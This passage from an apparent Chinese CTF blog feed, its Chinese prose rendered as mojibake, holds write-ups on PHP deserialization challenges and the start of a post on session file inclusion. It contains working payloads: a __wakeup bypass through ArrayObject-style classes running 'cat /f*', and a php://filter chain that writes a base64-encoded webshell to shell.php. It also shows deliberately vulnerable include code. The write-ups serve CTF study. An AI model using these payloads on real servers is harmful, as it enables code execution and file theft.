class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;ctfshow);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;1+1&gt;2&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ€è·¯å°±æ˜¯ç»•è¿‡wakeup,ä¸‹é¢è¿™ä¸ªæ­£åˆ™åŒ¹é…å°±æ˜¯ä¸èƒ½æ˜¯Oaå¼€å¤´ï¼Œæ‰€ä»¥æ•°ç»„ç»•è¿‡å°±ä¸å¯ä»¥ï¼Œç„¶åæœ‰ä¸€ç§ç»•è¿‡wakeupçš„æ–¹æ³•æ˜¯åœ¨Oæˆ–açš„åé¢æ•°å­—çš„å‰é¢åŠ ä¸Šä¸€ä¸ª+ï¼Œä½†è¿™åªæ˜¯ä½ç‰ˆæœ¬çš„ç»•è¿‡ã€‚</p><p>ç°åœ¨phpæ˜¯7.3ç‰ˆæœ¬ï¼Œéœ€è¦åˆ©ç”¨Cç»•è¿‡ã€‚</p><p>å¦‚æœæˆ‘ä»¬ä»…ä»…å°†Oæ”¹æˆCçš„è¯æ˜¯ä¸è§£æçš„ï¼Œå› ä¸ºè¿™ä¸ªCæ˜¯ä¸€ä¸ªç±»ï¼Œä¸åœ¨æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬æ²¡æœ‰å¯¹å®ƒè¿›è¡Œä¸€ä¸ªserialize å°±ä¸èƒ½è¿›è¡Œååºåˆ—åŒ–ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è¿™ä¸ªæ—¶å€™å°±è¦ç”¨åˆ°äº†å†…ç½®ç±»ã€‚</p><p>Arrayobjectã€‚</p><p>å½“ç„¶è¿˜æœ‰å…¶ä»–çš„ä¹Ÿå¯ä»¥ç”¨ï¼Œè¿™é‡Œå‚è€ƒå¸ˆå‚…çš„åšå®¢ï¼š<a href="https://boogipop.com/2023/04/02/%E6%84%9A%E4%BA%BA%E6%9D%AF3rd%20[easy_php]/">https://boogipop.com/2023/04/02/%E6%84%9A%E4%BA%BA%E6%9D%AF3rd%20[easy_php]/</a></p><p>å¯ä»¥ç”¨çš„ç±»æœ‰ï¼š</p><ul><li><p>ArrayObject::unserialize</p></li><li><p>ArrayIterator::unserialize</p></li><li><p>RecursiveArrayIterator::unserialize</p></li><li><p>SplObjectStorage::unserialize</p><p>ä¸‹é¢æˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸€ä¸ªæ¼”ç¤ºã€‚</p><p>ArrayObiect:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span> = <span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>();<br><span class="hljs-variable">$a</span> -&gt; b = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();  <span class="hljs-comment">//è¿™ä¸ªbçš„è¯å¯ä»¥æ˜¯å…¶ä»–å­—æ¯ï¼Œæ²¡æœ‰å½±å“</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151558694.png" alt="image-20230923113604625"></p></li></ul><p>ArrayIterator:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span> = <span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayIterator</span>();<br><span class="hljs-variable">$a</span> -&gt; b = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151558970.png" alt="image-20230923113657744"></p><p>RecursiveArrayIterator:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span> = <span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-built_in">RecursiveArrayIterator</span>();<br><span class="hljs-variable">$a</span> -&gt; b = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151559200.png" alt="image-20230923113836148"></p><p>SplObjectStorageï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span> = <span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplObjectStorage</span>();<br><span class="hljs-variable">$a</span> -&gt; b = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151559198.png" alt="image-20230923114023257"></p><p>è¿™é‡Œæˆ‘æ˜¯åœ¨æœ¬åœ°è¿›è¡Œæ‰§è¡Œçš„ï¼Œphpstormæˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰§è¡Œå®Œæ˜¯Oå¼€å¤´çš„ã€‚</p><h1 id="nssä¸Šé¢çš„ä¸€é¢˜ï¼š"><a href="#nssä¸Šé¢çš„ä¸€é¢˜ï¼š" class="headerlink" title="nssä¸Šé¢çš„ä¸€é¢˜ï¼š"></a>nssä¸Šé¢çš„ä¸€é¢˜ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popmart</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yuki</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$molly</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dimoo</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;yuki=<span class="hljs-string">&#x27;tell me where&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;molly=<span class="hljs-string">&#x27;dont_tell_you&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dimoo=<span class="hljs-string">&quot;you_can_guess&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$where_you_go</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;yuki=<span class="hljs-variable">$where_you_go</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;molly === <span class="hljs-variable language_">$this</span>-&gt;yuki)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;1&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$pucky</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wq&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pucky</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pucky</span>===<span class="hljs-string">&quot;äºŒä»™æ¡¥&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pucky</span>===<span class="hljs-string">&quot;äºŒä»™æ¡¥&quot;</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;script&gt;window.alert(&#x27;è¯´è¯´çœ‹ï¼Œä½ è¦å»å“ªï¼Ÿï¼Ÿ&#x27;);&lt;/script&gt;&quot;</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$pucky</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‰é¢çš„è¿˜å¥½ï¼Œå°±æ˜¯å¼•ç”¨ç»•è¿‡ï¼Œä¸»è¦æ˜¯åé¢çš„ä¼ å€¼ï¼Œè‡ªå·±ä¸æ€ä¹ˆä¼šï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p><p>å¥½å§ï¼Œçœ‹äº†wpä¹‹åæ‰å‘ç°è‡ªå·±æ˜¯ç¬¨æ¯”ã€‚</p><p>å‰é¢å› ä¸ºæ˜¯å˜é‡è¦†ç›–ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆè®©wq=äºŒä»™æ¡¥ è¿›å…¥ç¬¬äºŒä¸ªifåˆ¤æ–­ä¸­ï¼Œç„¶åä¸‹é¢å°±æ˜¯åœ¨postä¸­ä¼ å…¥pucky=â€¦..(ç»è¿‡åºåˆ—åŒ–åçš„å€¼ ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ„é€ åå¾—å‡ºæ¥çš„)</p><h1 id="shctfæ–°ç”Ÿèµ›-sseerriiaalliizzee"><a href="#shctfæ–°ç”Ÿèµ›-sseerriiaalliizzee" class="headerlink" title="shctfæ–°ç”Ÿèµ›  sseerriiaalliizzee"></a>shctfæ–°ç”Ÿèµ›  sseerriiaalliizzee</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$barking</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;barking = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;barking-&gt;<span class="hljs-title function_ invoke__">dosomething</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$part1</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$part2</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; part1 = <span class="hljs-variable">$part1</span>;<br>        <span class="hljs-variable language_">$this</span> -&gt; part2 = <span class="hljs-variable">$part2</span>;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dosomething</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$useless</span>   = <span class="hljs-string">&#x27;&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;&#x27;</span>;<br>        <span class="hljs-variable">$useful</span>= <span class="hljs-variable">$useless</span>. <span class="hljs-variable language_">$this</span>-&gt;part2;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt; part1,<span class="hljs-variable">$useful</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dosomething</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;./flag,php&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;barking for fun!&quot;</span>;<br>        <br>    &#125;<br>&#125;<br><br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$code</span>))&#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$code</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no way, fuck off&quot;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå’Œ[ç¾ŠåŸæ¯ 2020]EasySerçš„é¢˜éå¸¸åƒ</p><p>ç»•è¿‡å°±æ˜¯æŠŠdieç»™è¿‡äº†</p><p>ç„¶åæ€è·¯å°±æ˜¯ç»™part1å’Œpart2åˆ†åˆ«è¿›è¡Œä¼ªåè®®å†™æ–‡ä»¶åå’Œbase64ä¼ æœ¨é©¬</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br><span class="hljs-variable">$b</span>-&gt;part1=<span class="hljs-string">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&#x27;</span>;<br><span class="hljs-variable">$b</span>-&gt;part2=<span class="hljs-string">&#x27;PD9waHAgc3lzdGVtKCJjYXQgL2YqIik7Pz4=&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;barking=<span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>phpååºåˆ—åŒ–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sessionæ–‡ä»¶åŒ…å«</title>
    <link href="/2023/09/15/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/09/15/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="sessionæ–‡ä»¶åŒ…å«"><a href="#sessionæ–‡ä»¶åŒ…å«" class="headerlink" title="sessionæ–‡ä»¶åŒ…å«"></a>sessionæ–‡ä»¶åŒ…å«</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/201177#h2-1">https://www.anquanke.com/post/id/201177#h2-1</a></p><p>é€šè¿‡sessionåŒ…å«çš„åˆ©ç”¨æ¡ä»¶ï¼š<br>1.sessionæ–‡ä»¶è·¯å¾„å·²çŸ¥</p><p>å¯ä»¥é€šè¿‡phpinfo()æŸ¥çœ‹é‡Œé¢çš„sesion.save_pathæ¥è·å–</p><p>2.å…¶ä¸­éƒ¨åˆ†å†…å®¹å¯æ§</p><p>ä¸‹é¢æ¥ç®€å•æ¼”ç¤ºè¿™ä¸ªsessionæ–‡ä»¶åŒ…å«</p><p>session.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]=<span class="hljs-variable">$username</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>phpä¸­sessioné»˜è®¤æ˜¯ä»¥æ–‡ä»¶å½¢å¼è¿›è¡Œå‚¨å­˜çš„ï¼Œæ–‡ä»¶åæ˜¯sess_PHPSESSID è¿™ä¸ªPHPSESSIDæ˜¯å¯ä»¥çŸ¥é“çš„ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“äº†sessionçš„å‚¨å­˜ä½ç½®ï¼Œå¯ä»¥ä»phpinfo()ä¸­çœ‹åˆ°ç›¸å…³ä¿¡æ¯</p><p>å¹¶ä¸”é‡Œé¢çš„å†…å®¹æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ–‡ä»¶åŒ…å«è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ã€‚</p><p><img src="https://s2.loli.net/2023/09/15/tkfF3lU5YRdsXLh.png" alt="image-20230718172140755.png"></p><p><img src="https://s2.loli.net/2023/09/15/QPbLkUKo29fSYDG.png" alt="image-20230718172230624.png"></p><p><img src="https://s2.loli.net/2023/09/15/SbYqGraEfyHnp94.png" alt="image-20230718172351972.png"></p><p>ä¸Šé¢çš„æ˜¯sessionå‚¨å­˜è·¯å¾„</p><p>ä»¥ä¸Šåªæ˜¯æœ€ç®€å•çš„è¿›è¡Œä¸€ä¸ªåˆ©ç”¨ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œä¼šå¯¹ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯è¿›è¡Œä¸€ä¸ªç¼–ç ï¼Œæˆ–è€…è¯´æ²¡æœ‰session_start() è¿™æ ·çš„æƒ…å†µä¸‹ä¸Šé¢çš„æƒ…å†µå°±ä¸èƒ½æ‰§è¡ŒæˆåŠŸï¼Œæ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•è¿›è¡Œç»•è¿‡ã€‚</p><h1 id="ä¸‹é¢æ˜¯å‡ ç§æƒ…å†µçš„ç»•è¿‡ï¼š"><a href="#ä¸‹é¢æ˜¯å‡ ç§æƒ…å†µçš„ç»•è¿‡ï¼š" class="headerlink" title="ä¸‹é¢æ˜¯å‡ ç§æƒ…å†µçš„ç»•è¿‡ï¼š"></a>ä¸‹é¢æ˜¯å‡ ç§æƒ…å†µçš„ç»•è¿‡ï¼š</h1><h2 id="1-sessionç»è¿‡base64ç¼–ç "><a href="#1-sessionç»è¿‡base64ç¼–ç " class="headerlink" title="1.sessionç»è¿‡base64ç¼–ç "></a>1.sessionç»è¿‡base64ç¼–ç </h2><p>è¿™ç§æƒ…å†µä¸‹ä¸€èˆ¬æƒ³åˆ°çš„æ˜¯å¯¹sessionè§£ç å°±å¯ä»¥äº†ï¼Œåˆ©ç”¨é‚£ä¸ªphpä¼ªåè®®ï¼Œä½†æ˜¯å§ï¼Œç”±äºbase64çš„ç¼–ç è§„åˆ™ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥åˆ©ç”¨è¿™ä¸ªphpä¼ªåè®®ï¼Œéœ€è¦æ„é€ é•¿åº¦ï¼Œè®©phpä¼ªåè®®å»è§£ç çš„æ—¶å€™ï¼Œä¸å½±å“åé¢çš„ã€‚</p><p>session.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/09/15/rMeGND46xv2EfkB.png" alt="image-20230718183919467.png"></p><p>ä¸‹é¢æ¥è®²ä¸€ä¸‹è¿™ä¸ªbase64çš„ç¼–ç è§„åˆ™ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.å°†ä¼ å…¥çš„å­—ç¬¦è½¬æ¢æˆ<span class="hljs-number">2</span>è¿›åˆ¶ æ ¹æ®asciiè¿›è¡Œåˆ’åˆ† æ˜¯<span class="hljs-number">8</span>ä½ ï¼ˆä¸æ»¡<span class="hljs-number">8</span>ä¸ªé«˜ä½è¡¥é›¶ï¼‰<br><span class="hljs-attribute">2</span>.å°†<span class="hljs-number">8</span>ä½çš„äºŒè¿›åˆ¶è¿›è¡Œ<span class="hljs-number">6</span>ä½ä¸€ç»„åˆ’åˆ†ï¼Œå› ä¸º<span class="hljs-number">2</span>^<span class="hljs-number">6</span>=<span class="hljs-number">64</span>  ä¸æ»¡<span class="hljs-number">6</span>ä½çš„è¡¥é›¶<br><span class="hljs-attribute">3</span>.æ€»çš„æ¯”ç‰¹æ•°å¾—æ˜¯<span class="hljs-number">24</span>çš„å€æ•°ï¼Œ<span class="hljs-number">6</span>å’Œ<span class="hljs-number">8</span>çš„æœ€å°å…¬å€æ•°æ˜¯<span class="hljs-number">24</span> ä¸æ»¡è¶³çš„è¡¥é›¶ï¼Œè¡¥çš„é›¶è½¬æ¢æˆ=<br><span class="hljs-attribute">4</span>.æœ€åæ ¹æ®è¡¨æ ¼è½¬æ¢æˆå­—ç¬¦ä¸²<br></code></pre></td></tr></table></figure><p><img src="https://p3.ssl.qhimg.com/t0178a983065875c97e.png" alt="img"></p><p><img src="https://p1.ssl.qhimg.com/t01eec8c9eb8ff18e75.png" alt="img"></p><p>ç»è¿‡base64ç¼–ç è¿‡åçš„é•¿åº¦æ˜¯åŸé•¿åº¦çš„4/3</p><p>ç¼–ç äº†è§£äº†ï¼Œä¸‹é¢çœ‹ä¸€ä¸‹è§£ç ï¼Œè§£ç å’Œç¼–ç å·®ä¸å¤šï¼Œç¼–ç 